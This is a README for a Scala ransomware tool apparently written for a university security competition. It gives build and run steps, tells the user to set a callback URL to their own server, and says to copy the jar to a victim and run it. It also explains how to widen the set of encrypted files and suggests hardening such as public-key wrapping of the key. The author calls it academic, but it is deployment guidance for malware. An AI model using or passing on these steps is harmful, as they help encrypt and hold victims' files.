DongerLocker
===
Super dank Scala based crypto locker

I wrote this in a hack/prep night to for the information security talent search (ISTS) @ Rochester Institute of Technology.

Its by no way production ready, but it runs on a JVM so if you can find a box with Java on it (Windows or Linux), it will perform its function. 

Please improve/learn from this, its academic code and in no way do I endorse using this for evil.

Build
===
Make sure sbt is installed

```sbt compile```

```sbt one-jar``` <-- this gets it packed into one java binary


Run
===

Change URL on line 27 from https://hardlyuseful.com to your serv.

Then, compile, sbt one-jar, cp then run on victim.

Things to note:

Change whitelist (I encrypt everything in /bin but a few for Linux, and Program Files for Linux)

There are some commented out pieces of code to get userfolder, and its trivial to build a list of file extensions that you want to target.

```cp target/scala-2.10/dongerlocker_2.10-1.0-one-jar.jar donger.jar```

Encrypt
==

```java -jar donger.jar enc```

Decrypt
==

```java -jar donger.jar dec```

Things it doesnt do
===

Ideally, port a pub key to encrypt the symmetric key:IV to send that as one parameter when you encrypt everything.

Also, separate IV per file, and better encrypted file detection (magic values prepended/appended instead of a meme extension is ideal)

